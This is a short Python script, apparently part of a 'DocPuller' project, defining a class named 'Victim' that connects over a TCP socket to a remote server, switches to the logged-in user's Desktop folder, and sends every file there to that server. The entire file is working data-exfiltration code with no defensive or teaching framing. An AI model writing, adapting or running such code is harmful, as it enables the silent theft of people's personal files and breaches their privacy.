__author__ = 'ben'

import os
import socket

from real.DocPullerScripts.DocPullerFTP.protocol import Protocol


class Victim(Protocol):

    def __init__(self, server, port):
        super().__init__(server, port)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        try:
            self.victim.connect(self.ADDR)
        except Exception as e:
            print(e)

        connected = True
        if connected:
            os.chdir(f'/Users/{os.getlogin()}/Desktop')
            for file in os.listdir():
                if os.path.isfile(file):
                    with open(file, 'rb') as f:
                        data = f.read()
                    self.send_file(self.victim, file.encode(), data)
                    print('----------------------------------------')
                    print('sending', file)
            connected = False
        self.victim.close()
        print('done.')


if __name__ == '__main__':
    Victim(1, 1).start()
